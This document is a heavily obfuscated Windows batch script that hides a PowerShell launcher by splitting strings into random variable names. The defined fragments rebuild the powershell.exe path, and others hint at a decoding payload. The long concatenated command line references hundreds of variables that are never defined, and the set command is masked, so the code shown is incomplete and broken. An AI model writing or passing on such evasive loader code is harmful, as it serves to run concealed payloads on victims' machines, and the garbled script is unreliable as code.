@echo off
!wKBrAYVCWPaeXGdarZQH! "vOFBoUBhXp=yste"
!wKBrAYVCWPaeXGdarZQH! "gxntHNKubO=m($y"
!wKBrAYVCWPaeXGdarZQH! "wIHgxZcyOL=ar=d"
!wKBrAYVCWPaeXGdarZQH! "WqyAqzngeK=-Obj"
!wKBrAYVCWPaeXGdarZQH! "dyptxVlxSS=BaVa"
!wKBrAYVCWPaeXGdarZQH! "drCCFDDFcG= dec"
!wKBrAYVCWPaeXGdarZQH! "eCpyaoBJmJ=_var"
!wKBrAYVCWPaeXGdarZQH! "wyPXvJJRQu=es_v"
!wKBrAYVCWPaeXGdarZQH! "KkKKZBoyTc=erSh"
!wKBrAYVCWPaeXGdarZQH! "jOjmImJaCl=\pow"
!wKBrAYVCWPaeXGdarZQH! "OSBDzjSEuk=ersh"
!wKBrAYVCWPaeXGdarZQH! "VhxYeKctjU=\Sys"
!wKBrAYVCWPaeXGdarZQH! "FOvSDERyxk=sPow"
!wKBrAYVCWPaeXGdarZQH! "aKrfPnZavA=v1.0"
!wKBrAYVCWPaeXGdarZQH! "kOtKIIhENr=\Win"
!wKBrAYVCWPaeXGdarZQH! "AaJZjFiQDJ="%systemdrive%"
!wKBrAYVCWPaeXGdarZQH! "buSYfbmGxt=2\Wi"
!wKBrAYVCWPaeXGdarZQH! "JJCqNhiOFF= "
!wKBrAYVCWPaeXGdarZQH! "ZyOcCQiNfb=dows"
!wKBrAYVCWPaeXGdarZQH! "NvHpFrfXcv=tem3"
!wKBrAYVCWPaeXGdarZQH! "yvVQxsKeCC=ell\"
!wKBrAYVCWPaeXGdarZQH! "CocsSJlJhk=exe""
!wKBrAYVCWPaeXGdarZQH! "UMWUkaTFVM=ell."
!wKBrAYVCWPaeXGdarZQH! "xuLCNdruFX=ndow"
%AaJZjFiQDJ%%kOtKIIhENr%%ZyOcCQiNfb%%VhxYeKctjU%%NvHpFrfXcv%%buSYfbmGxt%%xuLCNdruFX%%FOvSDERyxk%%KkKKZBoyTc%%yvVQxsKeCC%%aKrfPnZavA%%jOjmImJaCl%%OSBDzjSEuk%%UMWUkaTFVM%%CocsSJlJhk%%JJCqNhiOFF%%UsTrUFYuiJ%%ZECkzwqFKu%%FkhQkYgxwH%%sMAQbqjXii%%wiQslxPgVy%%FWyySJlchV%%yBYAqmdLij%%ntxBXxtOEN%%jaBXcwocYr%%fgQmJVkqbZ%%teXMklzXAv%%pwytMyZaxU%%YbMRegDkRc%%mdNFufcPNQ%%WqBCcIIwAl%%VkSgarrgIe%%IpfyilISZH%%vjnGXHAjOv%%ygKGgclGEc%%NVhJiHlcuQ%%ZPxSPMXlit%%RhsmFCEzsg%%acnXUzbEyp%%wyPXvJJRQu%%faxlkGDUdG%%cMKnQXBzYp%%KtMTXtruRW%%SMJYbaEbMn%%WhASmJNChx%%hjTAJMnEoR%%ojdhNqdMlP%%tANKtDSUGn%%FPmtPJTiop%%NZMVZMdtfW%%GbqreHwjgg%%TtYblyXJrd%%wUxWctNSKH%%zzOJGEzUoi%%nKciwtbLJB%%PtbbAMDtpL%%UEyzGtEpvH%%ZcvjQMSpAJ%%sbijSfyNjT%%bfFDoIlCBc%%OLpbCMYRkN%%UnTGtSvpHA%%VRgBFTxRVh%%ApNxUGLgHf%%gHCvZNlZjv%%nWVahXFOwI%%pgVcnEzvLN%%goHBtopKCR%%IyIATEtNqW%%aXKZQaLziu%%oPnwpZotGS%%IUlEZRyviJ%%lMfPMiDILt%%CPChDSklkU%%pZgxofMgZY%%BqqyjCKyJg%%wGInqSrdag%%GnkotlGHAG%%wwIMSmydYb%%iMBexJrThv%%NIfSsogcfY%%WcXcKZXVue%%unfZYULfQK%%TMAfTNrQuD%%fwYafgOyty%%MwycbzDfUx%%CalvfjCSjW%%IhAQYXpfUS%%gmMsXwoxdt%%klVXaflDVV%%EVpxQFWHed%%kxlcrqoTxI%%UeOQMwlDPS%%MLkYokXpBs%%AHtaiMaSFK%%RsgmbzgyLt%%ttRlrynmOh%%sYreinLOHZ%%wsXfbuFXXO%%dyEhZgPhIJ%%zNeyrSaceN%%OsQLXavMkX%%TqoZdTujfb%%yDfXzIozNi%%tDTkaKHSkY%%LcXLQjzeux%%yQWcpkmTlp%%LVYbDqweZs%%mCZgqvGuhq%%jkepKDGQVQ%%yOGUnPdWhA%%MueclVQQMT%%DSMUfBQJqa%%KFjjUxVeTA%%rKmHEOfcdP%%MPebmFcLPL%%YuFgQglVhO%%ZLXlCTFeqq%%vOFBoUBhXp%%ukphCXegRy%%DkVpPaRSzs%%ZXvypkPeSV%%FdXStPwQJF%%PznSNlTpMn%%cIIEpxPRRr%%hZoVTAmcWZ%%EbjUDzJDLe%%rzsESWutCV%%aEYrxPlsZm%%YQtMIbyObQ%%NmfNaIHJdW%%gTAaZZdRwN%%orEyfBgFVR%%xFrMiOzkrO%%iBocgfpsMI%%YHroCvIGIz%%CbNmyACOSl%%ASzIFMdBsZ%%lNTmSQodkM%%fSCSmgOcEG%%DBzBifhJIP%%shoInOiBtH%%lzEgfHpHvy%%YaWMwJnreM%%IEuutYETEx%%YmIXueXtwA%%PAnkRskCmD%%ARwGYHejMg%%dwdYALrZrs%%MTVDWirjCb%%OcHaWgQcYN%%ZNHpwtwpJg%%alkURHVSJQ%%pVHLsbOcbt%%UpaEsYmFhD%%MbAvbCRNjp%%lXsixegVXv%%EtnplKkFBS%%uqLgdnulKP%%jbTLiXXSgo%%SrHLYsNkkq%%smlqVUllej%%JVlimDzCho%%MrznacIZiL%%zkbtxXPDQn%%LLOWFWfzzu%%SldVEaMYpS%%lmdsKzUSLo%%NWLTCbDCHd%%XjANTnhfPw%%kRnXczIvmg%%cnOkHVzjtD%%xkqmVcLqzw%%rPdoeWJORd%%shpBbJupfX%%OXMlZZAbbZ%%NrVQOnkzgL%%mLsqkpUOkm%%HwkCIucRpe%%vHMRpbmzNO%%zVjuKcFwbK%%fLQPrrhtiu%%ktkbqEYAaj%%cubwMMnQRF%%OGPFZJRWAY%%TSrtDgKheg%%devSHKKucE%%drCCFDDFcG%%NcZcpkdISG%%bfMLBKlWXp%%ZwTVUCqPNa%%CffxsbesDx%%GcCwDXFQaV%%sGHNHqieiN%%ToUReVaosA%%FStAIWUxsW%%XzOSIVyrPb%%SakQDshKrH%%WqyAqzngeK%%wLMlPtzcjj%%xJyqHEHDXp%%PjfKZGboCi%%IrmfFhoYaj%%SfAijnRhSL%%RJjPVmFbmj%%slzbBgwtLA%%qJDNxJJXBL%%OUwQqYhxjs%%BmMRRHFzHd%%Ryvrvigvrm%%DHABuxPJLC%%ZYktYdXLWQ%%djqyTqzfvh%%RLfXOTMkwt%%RWOedTobsr%%luzBitrcHe%%YKnDLnSmEe%%rMpCYhvlua%%bxMeWwlDPu%%CKDrvhJksP%%abxnayfWDb%%YfHHcAXjGp%%boxjCHiXgQ%%xkTEZZayex%%rpaOwwcWpV%%kADdOLEnLt%%qhQNDNmdHc%%AyejXMoJNg%%EmIlGXHPQo%%vMNKhjynlJ%%jYpmuLvufb%%xVzEOdzEhF%%gxntHNKubO%%obyeXGXwQU%%CmJPRzmjWe%%KTgFCMLVEG%%absrNvxvHi%%gdOmdTNxCi%%BBxXeuVSBk%%UbRkTBTsbv%%cRBOYHfTCJ%%YntwfyDvnt%%AETwnelDsC%%ZvwgfJaJZx%%obqSmGHvev%%XyfIUxXfAT%%vBAaJDRnqv%%yUvQeyobjH%%wPzXEBpNlI%%LVjfbMBqjJ%%PueIWdcpDw%%iWVTwGcDvi%%nebHKDKpPs%%XYSARcKQaB%%yajPAPapIu%%JXUbwLswYt%%sNAlyjeubu%%VmCUJmUmhV%%DvGuIaeQeg%%JnSHiLAYqq%%KFoozxuarj%%QgodQXggCy%%fnqULHuVLY%%MVVRkXgsUl%%FdzUpCYOQl%%FuwRkwptCS%%dyptxVlxSS%%QNlqTcOwFi%%IFeztrzdGO%%INPcigOgwu%%qBVYuRjfYi%%ITOtjxuPZg%%vhQekdYiiM%%nIZkSgJgeC%%iueyfPZvTK%%MYgqYiLROr%%SaWmUaTDBc%%OnKxXbdsYu%%eCpyaoBJmJ%%vSsNJhxSDf%%VvTQWyoIsW%%fsStnqLxlF%%ykrSHVVXOQ%%EkOTzIJyCB%%aTqpDcaYAs%%vZHXGLeaja%%CrTCsVEYUE%%HmVKFFTcpE%%UXwwuEDQmN%%EIpBYJZOWI%%yceVLjeWsb%%RcLFgFUxhN%%rNMgaZXtLV%%FffHfSTAKl%%AGykWCWKus%%OCHiqKqXVM%%lKlwvMWezo%%MtMWnLoBky%%cnYshdxXqv%%CVEYZQucPk%%FSlgGuPLVF%%vPNxJYLTps%%oZOdMRPOWw%%qmMZSkcSMM%%nMbKZNihob%%fBMwVGehuP%%FbOzpjcNFz%%WShDeBXdeY%%JHzVqOApel%%fUxXglYCvQ%%KuBOemujru%%JacvgXCTiA%%JNJttbvkwS%%DuIooofKQd%%uqYJCeSbQi%%JftUhWLiud%%RjMyRosNhR%%RRcegsPZRo%%jutojxaNhr%%DXpNmkDzSn%%MeUZqScoOO%%hLrfUxQypt%%oEGPoUBpSV%%OphDCeztXq%%vLZskSGjSO%%ufjzZhxeLw%%qMwSaRDNDP%%XwBYXCFnFw%%orxdBJgHEv%%GuIBaJpgss%%oSGdRXDkBx%%CkzpiYpsrq%%LWiiiCOaYo%%myVmhvLtmE%%fVghTwVtsb%%tXPcHsKyUo%%jDmnkdonhN%%nVfNlQPboL%%HuHXUpISFP%%LnzXuBISWP%%hImFOyRcQQ%%CIjiHOWotU%%vvHrbavhsJ%%hXezEZibjw%%yFcOncdrqG%%FuzbuLaUDN%%cJKhJEDKEI%%GVfXwPtTdZ%%WeRMeNyceS%%YnxvtOUUeI%%ytNIZJoCFE%%sgRERXSYcW%%gBFMJtxKDI%%UzOvADriMu%%yVxAASwSEv%%WWSiBXObZG%%mEYXKTrwen%%GJmHxkdfmR%%WFfiLYGGTC%%PqjgiUXAPG%%AaOqPnKkKq%%UIOhJHyQlL%%mKCBypzgzC%%nDpFqWQPsy%%owWCIgBbwB%%whoduPxnRz%%NELhdrtjQM%%QIxNxPOaSr%%OxJXggolkB%%zDXTKJLOyr%%NrkJLNJBFF%%awuAKpUNbW%%chZpmnLDcO%%daBBEwnZms%%wNFFAdjxiv%%PYMCpFsVwy%%cfyRBaUTVo%%cUAJzpBtPj%%envGYfnZlY%%erCOproNez%%ipBUtUxdcZ%%eYgnuOKSTv%%NUHWkKrMti%%bNppaOLAnd%%IjXmUflpuB%%GwUILnIFKI%%DKKTYqIQmF%%cjEPMEXvce%%zcsRBFTGEM%%ggQFAXzenE%%wucOyxRfWh%%qmCFiAsSrt%%wcmAzVtYoP%%fShxIeZDte%%NOKwvTDkwa%%FGMUhuiCpC%%dTQgcxfeXe%%AOznGIrPeF%%riCokygnqn%%WxoQaTXDuY%%OzmszQhzoy%%csyJlUqBWD%%rSOJhdAJmM%%LOvfRSVjPt%%rHYSlEZEFg%%DvHRGWKDkw%%qxnCNoWsSs%%YgMClKTWyD%%eVefjpgEzU%%hsZtdTtweX%%HGMmhwIeFW%%dOfGruthsy%%hsTXkGhtzr%%qwRAWxjRYN%%GcZCRtnsbI%%AmdGQpNOcB%%opFnGGXEKU%%lBjFRetqgR%%sOsQReskKH%%JuPwyqxLWk%%wIHgxZcyOL%%VwHkizXOwB%%oMUdlQLMhA%%HHuWvJglsR%%bUwZLmMFnY%%tIpuVJODUG%%nqqoeocLPz%%sLwEAuqVsY%%dgyigYsZaL%%UCqMELDhUx%%kbQOFImKUB%%tTlVCgRhhg%%VcLdEPuJZO%%QiaVOcqKDx%%LHfyrbrvjx%%UvaOBhqMkP%%oCKgKlTqhA%%QgEJuoXmLD%%yZACUviltH%%MDANjjWZOg%%hbnJGNRqun%%kdbHrpcilp%%cHWzNnGQAk%%rYxFvxLQVh%%ESRgxICTwT%%gONzdAeOWt%%gaPjVlGvlU%%EmmdKkPQcf%%KNuGeDkYBU%%sXUBaDcIkl%%cgHCpUBJOS%%LoLQJtGjes%%bHUrBHsKcg%%ihGRdDgRrk%%bAjIjdldSH%%XTDRkumpaI%%BQHHKDIUNf%%nORUrAylhx%%voSvjpDOGI%%rQRJIkTBYF%%vrpMujbIAJ%%WahCmmYlyu%%aTneOwWimg%%GWmCceZfaZ%%oUoXMqIpwv%%mHdEFCelYX%%mSwtdZOFAi%%nSlzgfEqsx%%OHLQTYTIWA%%ZNgcMvxUTM%
!wKBrAYVCWPaeXGdarZQH! "apriISLvRW=exit"
!wKBrAYVCWPaeXGdarZQH! "HzQFENHnrZ= /b"
%apriISLvRW%%HzQFENHnrZ%
